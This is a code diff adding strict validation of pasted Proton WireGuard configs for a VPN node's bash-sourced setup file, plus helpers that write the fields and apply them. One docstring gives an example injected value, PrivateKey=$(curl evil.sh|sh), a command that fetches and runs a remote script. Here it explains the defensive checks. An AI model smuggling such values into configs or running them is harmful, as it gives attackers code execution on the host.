@@ -128,6 +128,155 @@ def _check_tunnel_matches_config(scope: GeoScope, interface: str, antizapret_pat
     return out
 
 
+_WG_KEY_RE = re.compile(r"^[A-Za-z0-9+/]{42,43}={1,2}$")
+_HOST_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?$")
+_IPV4_RE = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
+
+_PROTON_FIELD_KEYS = {
+    "antizapret": {
+        "private_key": "PROTON_ANTIZAPRET_PRIVATE_KEY",
+        "public_key": "PROTON_ANTIZAPRET_PUBLIC_KEY",
+        "address": "PROTON_ANTIZAPRET_ADDRESS",
+        "endpoint_host": "PROTON_ANTIZAPRET_ENDPOINT_HOST",
+        "endpoint_port": "PROTON_ANTIZAPRET_ENDPOINT_PORT",
+    },
+    "vpn": {
+        "private_key": "PROTON_VPN_PRIVATE_KEY",
+        "public_key": "PROTON_VPN_PUBLIC_KEY",
+        "address": "PROTON_VPN_ADDRESS",
+        "endpoint_host": "PROTON_VPN_ENDPOINT_HOST",
+        "endpoint_port": "PROTON_VPN_ENDPOINT_PORT",
+    },
+}
+
+
+class ProtonConfigError(ValueError):
+    """Вставленный WireGuard-конфиг Proton не прошёл валидацию."""
+
+
+def parse_proton_wg_conf(raw: str) -> dict[str, str]:
+    """Разобрать вставленный WireGuard-конфиг Proton - порт parse_proton_wg_conf() из setup.sh.
+
+    Строгая валидация каждого поля обязательна не только для UX (понятная ошибка
+    вместо кривого тоннеля) - setup файл потом читается через `source setup` в
+    bash (up.sh и другие скрипты). Значение вроде PrivateKey=$(curl evil.sh|sh)
+    без валидации стало бы исполняемой командой при следующем up.sh. Каждое
+    поле проверяется по строгому формату (base64-ключ/hostname/IPv4/порт) до
+    того, как что-либо попадёт в файл.
+    """
+    fields: dict[str, str] = {}
+    for line in raw.splitlines():
+        line = line.strip()
+        if not line or line.startswith("[") or line.startswith("#"):
+            continue
+        if "=" not in line:
+            continue
+        key, _, value = line.partition("=")
+        fields[key.strip().lower()] = value.strip()
+
+    private_key = fields.get("privatekey", "")
+    public_key = fields.get("publickey", "")
+    address_raw = fields.get("address", "")
+    endpoint_raw = fields.get("endpoint", "")
+
+    if not (private_key and public_key and address_raw and endpoint_raw):
+        raise ProtonConfigError("В конфиге должны быть PrivateKey, PublicKey, Address и Endpoint")
+
+    if not _WG_KEY_RE.match(private_key):
+        raise ProtonConfigError("PrivateKey не похож на настоящий WireGuard-ключ")
+    if not _WG_KEY_RE.match(public_key):
+        raise ProtonConfigError("PublicKey не похож на настоящий WireGuard-ключ")
+
+    address = address_raw.split(",")[0].strip().split("/")[0].strip()
+    if not _IPV4_RE.match(address):
+        raise ProtonConfigError(f"Address должен быть IPv4-адресом, получено: {address_raw!r}")
+
+    if ":" not in endpoint_raw:
+        raise ProtonConfigError("Endpoint должен быть в формате host:port")
+    endpoint_host, _, endpoint_port = endpoint_raw.rpartition(":")
+    if not _HOST_RE.match(endpoint_host):
+        raise ProtonConfigError(f"Endpoint host некорректен: {endpoint_host!r}")
+    if not endpoint_port.isdigit() or not (1 <= int(endpoint_port) <= 65535):
+        raise ProtonConfigError(f"Endpoint port должен быть 1-65535, получено: {endpoint_port!r}")
+
+    return {
+        "private_key": private_key,
+        "public_key": public_key,
+        "address": address,
+        "endpoint_host": endpoint_host,
+        "endpoint_port": endpoint_port,
+    }
+
+
+def _write_setup_fields(antizapret_path: Path, updates: dict[str, str]) -> None:
+    setup_file = antizapret_path / "setup"
+    if not setup_file.is_file():
+        raise FileNotFoundError(f"{setup_file} не найден")
+    lines = setup_file.read_text(encoding="utf-8", errors="replace").splitlines()
+    remaining = dict(updates)
+    for i, line in enumerate(lines):
+        if "=" not in line or line.lstrip().startswith("#"):
+            continue
+        key = line.split("=", 1)[0].strip()
+        if key in remaining:
+            lines[i] = f"{key}={remaining.pop(key)}"
+    for key, value in remaining.items():
+        lines.append(f"{key}={value}")
+    setup_file.write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+
+def save_proton_config(scope: Literal["antizapret", "vpn"], raw_config: str, antizapret_path: Path) -> dict:
+    """Разобрать, провалидировать и сохранить Proton-конфиг для одного scope.
+
+    Не проверяет и не запускает up.sh - вызывающая сторона решает, когда
+    применить (см. apply_warp_changes), чтобы можно было сохранить оба scope
+    перед одним общим перезапуском тоннелей.
+    """
+    parsed = parse_proton_wg_conf(raw_config)
+
+    other_scope = "vpn" if scope == "antizapret" else "antizapret"
+    other_keys = _PROTON_FIELD_KEYS[other_scope]
+    raw = _read_setup_file(antizapret_path)
+    other_private_key = raw.get(other_keys["private_key"], "").strip()
+    if other_private_key and other_private_key == parsed["private_key"]:
+        raise ProtonConfigError(
+            "Этот ключ уже используется для другого scope (antizapret/vpn) - Proton не даёт "
+            "одновременно держать два туннеля на одном ключе, вставьте другой конфиг."
+        )
+
+    field_keys = _PROTON_FIELD_KEYS[scope]
+    updates = {field_keys[name]: value for name, value in parsed.items()}
+    _write_setup_fields(antizapret_path, updates)
+    return {"success": True, "scope": scope}
+
+
+def set_warp_provider(provider: Literal["proton", "cloudflare"], antizapret_path: Path) -> dict:
+    _write_setup_fields(antizapret_path, {"WARP_PROVIDER": provider})
+    return {"success": True, "warp_provider": provider}
+
+
+def apply_warp_changes(antizapret_path: Path) -> dict:
+    """Выполнить /root/antizapret/up.sh, чтобы применить смену провайдера/ключей.
+
+    up.sh сам сначала вызывает down.sh - это кратко (секунды) обрывает ВСЕ
+    активные тоннели на узле (не только WARP), не только выбранный scope.
+    Тяжёлая операция для боевого узла, вызывающая сторона должна явно её
+    запрашивать, а не гонять при каждом сохранении конфига.
+    """
+    up_sh = antizapret_path / "up.sh"
+    if not up_sh.is_file():
+        return {"success": False, "output": f"{up_sh} не найден"}
+    try:
+        result = subprocess.run(
+            [str(up_sh)], cwd=str(antizapret_path),
+            capture_output=True, text=True, timeout=60,
+        )
+    except subprocess.TimeoutExpired as exc:
+        return {"success": False, "output": f"up.sh не завершился за 60с: {exc}"}
+    output = (result.stdout or "") + (result.stderr or "")
+    return {"success": result.returncode == 0, "output": output.strip()[-4000:]}
+
+
 def check_warp_geo(scope: GeoScope, antizapret_path: Path | None = None) -> dict:
     """Проверить гео исходящего трафика для scope (antizapret/vpn/raw).
 
